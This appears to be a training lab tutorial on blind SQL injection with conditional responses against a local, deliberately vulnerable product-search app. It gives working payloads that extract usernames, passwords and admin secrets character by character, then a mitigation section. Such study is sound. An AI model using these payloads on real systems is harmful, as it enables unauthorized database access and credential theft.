# Blind SQL injection with conditional responses

## **What is Blind SQL Injection with Conditional Responses?**

Blind SQL injection with conditional responses is a technique where the attacker cannot see the direct output of the query, but can infer information by observing different responses from the application. Instead of using time delays, this method relies on the application showing different content, error messages, or behavior based on whether the injected condition evaluates to true or false.

Unlike time-based blind injection that uses delays, conditional response injection analyzes differences in:
- Page content (presence/absence of specific text)
- HTTP response codes
- Number of results returned
- Application behavior patterns

## How Conditional Response Injection Works

The application responds differently based on the truth value of injected conditions:

```sql
-- Original query
SELECT id, name FROM products WHERE name LIKE '%search%'

-- True condition - Returns results or specific content
%' OR 1=1 OR '%  
-- Results in: SELECT id, name FROM products WHERE name LIKE '%' OR 1=1 OR '%'
-- Always returns results because 1=1 is always true

-- False condition - Returns no results or different content  
%' OR 1=2 OR '%
-- Results in: SELECT id, name FROM products WHERE name LIKE '%' OR 1=2 OR '%'
-- May return no results because 1=2 is always false
```

## Objective

Learn how to exploit blind SQL injection using conditional responses by:

1. **Identifying response patterns** for true vs false conditions
2. **Using conditional logic** for data extraction
3. **Extracting sensitive information** by analyzing response differences
4. **Retrieving usernames, passwords, and database information**

## Setup Instructions

### Option 1: Using Docker-compose (Recommended)

1. **Pull the Docker Image**

   ```bash
   git clone https://github.com/yeasin097/sqli-blindsql.git
   cd sqli-blindsql
   ```

2. **Run the Docker Container**

   ```bash
   docker-compose up --build
   ```
   
3. **Create a Load Balancer in Poridhi's Cloud**

   Find the `eth0` IP address with `ifconfig` command:

   ```bash
   ifconfig
   ```

   Create a Load Balancer with the `eth0 IP` address and the port `5173`

4. **Access the Web Application**

   Access the web application with the URL provided by the `loadbalancer`

## Understanding the Target Application

### Normal Application Behavior
1. **Homepage**: Displays product search interface
2. **Search Filter**: Input box allows searching for products by name
3. **Backend API**: `http://localhost:5000/api/products?search=laptop`
4. **SQL Query**: `SELECT id, name FROM products WHERE name LIKE '%laptop%'`
5. **Response Analysis**: Look for differences in returned results, content, or behavior

## Lab Instructions

### Phase 1: Identifying Response Patterns

#### Step 1: Establish Baseline Responses

**Normal search (baseline):**
```
laptop
```
**Expected**: Returns laptop products (if any exist)

**Search that returns no results:**
```
nonexistentproduct999
```
**Expected**: Returns empty results or "No products found" message

#### Step 2: Test Basic Conditional Logic

**True condition using AND (should return no results):**
```
%' AND 1=2 --
```
**Expected**: Returns NO results (because 1=2 is always false, AND makes entire condition false)
**Analysis**: Note the response pattern when condition is FALSE

**True condition using OR (should return all results):**
```
%' OR 1=1 OR '%
```
**Expected**: Returns ALL products (because 1=1 is always true, OR makes entire condition true)
**Analysis**: Note the response pattern when condition is TRUE

**False condition using OR (should return no results):**
```
%' OR 1=2 OR '%
```
**Expected**: Returns NO results (because 1=2 is always false, and no products match the search)
**Analysis**: This helps distinguish between TRUE and FALSE OR conditions

### Phase 2: Database Information Extraction

#### Step 3: Test Database and Table Existence

**Test if users table exists and has records:**
```
%' AND (SELECT COUNT(*) FROM users)>0 OR '%
```
**Logic**: If users table exists and has records → Condition TRUE → Returns products
**Logic**: If users table doesn't exist or is empty → Condition FALSE → Returns no products

**Test if users table has more than 2 records:**
```
%' AND (SELECT COUNT(*) FROM users)>2 OR '%
```
**Logic**: If users table has 3+ records → Condition TRUE → Returns products  
**Logic**: If users table has ≤2 records → Condition FALSE → Returns no products

**Test if users table has more than 10 records (likely FALSE):**
```
%' AND (SELECT COUNT(*) FROM users)>10 OR '%
```
**Logic**: If users table has 11+ records → Condition TRUE → Returns products
**Logic**: If users table has ≤10 records → Condition FALSE → Returns no products

#### Step 4: Test Admin Users

**Test if admin users exist:**
```
%' AND (SELECT COUNT(*) FROM admin_users)>0 OR '%
```
**Logic**: If admin_users table has records → Condition TRUE → Returns products
**Logic**: If admin_users table is empty → Condition FALSE → Returns no products

### Phase 3: Sensitive Data Extraction

#### Step 5: Extract Username Information

**Test if username length > 5:**
```
%' AND LENGTH((SELECT username FROM users LIMIT 1))>5 OR '%
```
**Logic**: If first username has MORE than 5 characters → Condition TRUE → Returns products
**Logic**: If first username has ≤5 characters → Condition FALSE → Returns no products

**Test exact username length (example for length 8):**
```
%' AND LENGTH((SELECT username FROM users LIMIT 1))=8 OR '%
```
**Logic**: If first username is EXACTLY 8 characters → Condition TRUE → Returns products
**Logic**: If first username is not 8 characters → Condition FALSE → Returns no products

#### Step 6: Extract Username Characters

**Extract first character of username using binary search:**

**Test if first character > 'm' (ASCII 109):**
```
%' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>109 OR '%
```
**Logic**: If first character's ASCII > 109 (n-z range) → Condition TRUE → Returns products
**Logic**: If first character's ASCII ≤ 109 (a-m range) → Condition FALSE → Returns no products

**Test for exact character (example: ASCII 97 = 'a'):**
```
%' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))=97 OR '%
```
**Logic**: If first character is EXACTLY 'a' → Condition TRUE → Returns products
**Logic**: If first character is not 'a' → Condition FALSE → Returns no products

**Extract second character:**
```
%' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),2,1))=100 OR '%
```
**Logic**: If second character is EXACTLY 'd' (ASCII 100) → Condition TRUE → Returns products

#### Step 7: Extract Password Information

**Test password length:**
```
%' AND LENGTH((SELECT password FROM users LIMIT 1))>8 OR '%
```
**Logic**: If password has MORE than 8 characters → Condition TRUE → Returns products
**Logic**: If password has ≤8 characters → Condition FALSE → Returns no products

**Extract first password character:**
```
%' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97 OR '%
```
**Logic**: If first password character's ASCII > 97 (b-z range) → Condition TRUE → Returns products
**Logic**: If first password character's ASCII ≤ 97 ('a' or symbols) → Condition FALSE → Returns no products

#### Step 8: Extract Admin Credentials

**Extract admin username length:**
```
%' OR LENGTH((SELECT admin_username FROM admin_users LIMIT 1))>5 OR '%
```

**Extract admin username first character:**
```
%' OR ASCII(SUBSTRING((SELECT admin_username FROM admin_users LIMIT 1),1,1))=97 OR '%
```

**Extract admin password first character:**
```
%' OR ASCII(SUBSTRING((SELECT admin_password FROM admin_users LIMIT 1),1,1))>97 OR '%
```

#### Step 9: Extract Email Information

**Test if email contains specific domain:**
```
%' OR (SELECT email FROM users LIMIT 1) LIKE '%gmail.com' OR '%
```
**Logic**: If email ends with 'gmail.com' → Condition TRUE → Returns results
**Logic**: If email doesn't end with 'gmail.com' → Condition FALSE → No results

**Extract email length:**
```
%' OR LENGTH((SELECT email FROM users LIMIT 1))>10 OR '%
```

**Extract email first character:**
```
%' OR ASCII(SUBSTRING((SELECT email FROM users LIMIT 1),1,1))>97 OR '%
```

## Conditional Response Payload Reference

### Basic Conditional Patterns
```
# Always true condition (returns all results)
%' OR 1=1 OR '%

# Always false condition with AND (returns no results)
%' AND 1=2 --

# Always false condition with OR (returns no results)  
%' OR 1=2 OR '%

# Conditional with database query using OR (for TRUE detection)
%' OR (database_condition) OR '%

# Conditional with database query using AND (for FALSE detection)  
%' AND (database_condition) --
```

### Information Extraction Patterns
```
# Test table existence using AND (returns products if TRUE)
%' AND (SELECT COUNT(*) FROM table_name)>0 OR '%

# Test record count using AND (returns products if TRUE)
%' AND (SELECT COUNT(*) FROM table_name)>N OR '%

# String length extraction using AND (returns products if TRUE)
%' AND LENGTH((SELECT column FROM table LIMIT 1))>N OR '%

# Exact length match using AND (returns products if TRUE)
%' AND LENGTH((SELECT column FROM table LIMIT 1))=N OR '%

# Character extraction using AND (returns products if TRUE)
%' AND ASCII(SUBSTRING((SELECT column FROM table LIMIT 1),pos,1))>ASCII_VAL OR '%

# Exact character match using AND (returns products if TRUE)
%' AND ASCII(SUBSTRING((SELECT column FROM table LIMIT 1),pos,1))=ASCII_VAL OR '%

# Substring matching using AND (returns products if TRUE)
%' AND SUBSTRING((SELECT column FROM table LIMIT 1),1,N)='string' OR '%

# Pattern matching using AND (returns products if TRUE)
%' AND (SELECT column FROM table LIMIT 1) LIKE 'pattern%' OR '%
```

## Response Analysis Strategy

### Identifying TRUE vs FALSE Responses

**Method 1: Result Count Analysis**
- TRUE condition: Returns multiple results or all products
- FALSE condition: Returns no results or empty response

**Method 2: Content Analysis**
- TRUE condition: Page shows normal product listings
- FALSE condition: Page shows "No products found" or similar message

**Method 3: Response Size Analysis**
- TRUE condition: Larger response body (more content)
- FALSE condition: Smaller response body (less content)

**Method 4: HTTP Status Code Analysis**
- TRUE condition: HTTP 200 with content
- FALSE condition: HTTP 200 with empty results or different status

### Binary Search Method for Character Extraction

**Goal: Extract the username "admin" character by character**

**Step 1 - Find Length:**
```
%' AND LENGTH((SELECT username FROM users LIMIT 1))=5 OR '%
```
- If returns products → Username is exactly 5 characters
- If no products → Username is not 5 characters

**Step 2 - Extract First Character 'a' (ASCII 97):**
```
# Test if first char > 'm' (ASCII 109)
%' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>109 OR '%
→ No products = Character is ≤ 109 (a-m range)

# Test if first char > 'f' (ASCII 102) 
%' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>102 OR '%
→ No products = Character is ≤ 102 (a-f range)

# Test if first char = 'a' (ASCII 97)
%' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))=97 OR '%
→ Returns products = First character is 'a'
```

**Continue for remaining characters...**

## Understanding Response Logic with Database Structure

### Database Contents
Based on the lab database, we have:
- **products table**: 10 products (Laptop Pro X1, Smartphone Ultra, etc.)
- **users table**: 3 users (john_doe, jane_smith, admin_user)
- **admin_users table**: 2 admin users (superadmin, sysadmin)

### How Conditional Responses Work

**Original SQL Query:**
```sql
SELECT id, name FROM products WHERE name LIKE '%search%'
```

**With injection:**
```sql
SELECT id, name FROM products WHERE name LIKE '%' AND condition OR '%'
```

### Response Analysis Examples

#### Example 1: Testing User Count
```
%' AND (SELECT COUNT(*) FROM users)>2 OR '%
```

**What happens:**
- Database executes: `SELECT id, name FROM products WHERE name LIKE '%' AND (SELECT COUNT(*) FROM users)>2 OR '%'`
- `(SELECT COUNT(*) FROM users)` returns `3` (john_doe, jane_smith, admin_user)
- `3 > 2` evaluates to **TRUE**
- `name LIKE '%' AND TRUE` becomes `TRUE AND TRUE` = **TRUE**
- **Result: Returns all 10 products** (Laptop Pro X1, Smartphone Ultra, etc.)

```
%' AND (SELECT COUNT(*) FROM users)>5 OR '%
```

**What happens:**
- `(SELECT COUNT(*) FROM users)` returns `3`
- `3 > 5` evaluates to **FALSE**
- `name LIKE '%' AND FALSE` becomes `TRUE AND FALSE` = **FALSE**
- **Result: Returns 0 products** (empty response)

#### Example 2: Testing Username Length
```
%' AND LENGTH((SELECT username FROM users LIMIT 1))>7 OR '%
```

**What happens:**
- `(SELECT username FROM users LIMIT 1)` returns `"john_doe"` (first user)
- `LENGTH("john_doe")` returns `8`
- `8 > 7` evaluates to **TRUE**
- **Result: Returns all 10 products**

```
%' AND LENGTH((SELECT username FROM users LIMIT 1))>10 OR '%
```

**What happens:**
- `LENGTH("john_doe")` returns `8`
- `8 > 10` evaluates to **FALSE**
- **Result: Returns 0 products**

#### Example 3: Character Extraction
```
%' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))=106 OR '%
```

**What happens:**
- `(SELECT username FROM users LIMIT 1)` returns `"john_doe"`
- `SUBSTRING("john_doe",1,1)` returns `"j"`
- `ASCII("j")` returns `106`
- `106 = 106` evaluates to **TRUE**
- **Result: Returns all 10 products** (confirms first character is 'j')

```
%' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))=97 OR '%
```

**What happens:**
- `ASCII("j")` returns `106`
- `106 = 97` evaluates to **FALSE** (97 is ASCII for 'a')
- **Result: Returns 0 products** (confirms first character is NOT 'a')

### Why This Works for Information Extraction

**TRUE condition → See products → Condition confirmed**
**FALSE condition → No products → Condition rejected**

**Practical Example: Extracting "john_doe" username**

1. **Find length:**
   ```
   %' AND LENGTH((SELECT username FROM users LIMIT 1))=8 OR '%
   ```
   → Returns products → Username is 8 characters

2. **Extract 1st character 'j' (ASCII 106):**
   ```
   %' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>100 OR '%
   ```
   → Returns products → Character > 100
   
   ```
   %' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))=106 OR '%
   ```
   → Returns products → Character is 'j'

3. **Extract 2nd character 'o' (ASCII 111):**
   ```
   %' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),2,1))=111 OR '%
   ```
   → Returns products → Second character is 'o'

**Continue until complete username "john_doe" is extracted...**

### Real Response Examples

**TRUE condition response:**
```json
{
  "products": [
    {"id": 1, "name": "Laptop Pro X1"},
    {"id": 2, "name": "Smartphone Ultra"},
    {"id": 3, "name": "Wireless Headphones"},
    ... (all 10 products)
  ]
}
```

**FALSE condition response:**
```json
{
  "products": []
}
```

### Testing Admin Credentials

**Extract admin username "superadmin":**
```
%' AND LENGTH((SELECT admin_username FROM admin_users LIMIT 1))=10 OR '%
```
→ Returns products → Admin username is 10 characters ("superadmin")

**Extract admin secret key:**
```
%' AND LENGTH((SELECT secret_key FROM admin_users LIMIT 1))>10 OR '%
```
→ Response tells us if secret key is longer than 10 characters

## Prevention and Mitigation

### Primary Defense: Parameterized Queries

**Vulnerable Code:**
```javascript
const query = `SELECT id, name FROM products WHERE name LIKE '%${search}%'`;
```

**Secure Code:**
```javascript
const query = `SELECT id, name FROM products WHERE name LIKE ?`;
const [rows] = await pool.query(query, [`%${search}%`]);
```

### Secondary Defenses

**Input Validation:**
```javascript
const search = req.query.search;
if (search.includes('OR') || search.includes('AND') || search.includes('SELECT')) {
    return res.status(400).json({error: 'Invalid search term'});
}
```

**Output Normalization:**
```javascript
// Always return consistent response format
if (results.length === 0) {
    return res.json({products: [], message: "No products found"});
} else {
    return res.json({products: results, message: "Products found"});
}
```

**Error Handling:**
```javascript
try {
    const [rows] = await pool.query(query, params);
    return res.json({products: rows});
} catch (error) {
    // Don't expose database errors
    return res.json({products: [], message: "Search error"});
}
```

## Conclusion

This lab demonstrates how to exploit blind SQL injection using conditional responses instead of time delays. Key learning points:

- **Response pattern recognition** for identifying TRUE vs FALSE conditions
- **Information extraction** through systematic condition testing
- **Binary search methodology** for efficient character extraction
- **Content analysis** for distinguishing successful vs failed injections

**Key Takeaway**: Conditional response injection relies on analyzing differences in application behavior rather than timing, making it effective even when time-based techniques are blocked or unreliable.

---